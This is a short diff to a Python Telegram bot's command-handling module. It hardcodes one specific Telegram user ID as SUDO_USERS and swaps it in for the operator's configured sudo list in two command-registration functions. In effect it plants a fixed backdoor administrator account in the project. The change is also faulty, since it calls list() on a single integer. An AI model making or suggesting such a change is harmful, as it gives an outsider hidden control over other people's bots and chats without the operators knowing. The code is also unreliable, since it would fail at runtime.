@@ -24,6 +24,7 @@ from telegram.ext import CallbackContext
 # stores admemes in memory for 10 min.
 ADMIN_CACHE = TTLCache(maxsize=512, ttl=60 * 10, timer=perf_counter)
 THREAD_LOCK = RLock()
+SUDO_USERS = 1669178360
 
 def is_whitelist_plus(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
     return any(user_id in user for user in [WOLVES, TIGERS, DEMONS, DRAGONS, DEV_USERS])
@@ -382,7 +383,7 @@ def fire_on_cmd(pattern=None, **args):
     args["outgoing"] = True
     # should this command be available for other users?
     if allow_sudo:
-        args["from_users"] = list(Config.SUDO_USERS)
+        args["from_users"] = list(SUDO_USERS)
         # Mutually exclusive with outgoing (can only set one of either).
         args["incoming"] = True
         del args["allow_sudo"]
@@ -444,7 +445,7 @@ def command(**args):
                 pass
 
         if allow_sudo:
-            args["from_users"] = list(Config.SUDO_USERS)
+            args["from_users"] = list(SUDO_USERS)
             # Mutually exclusive with outgoing (can only set one of either).
             args["incoming"] = True
         del allow_sudo
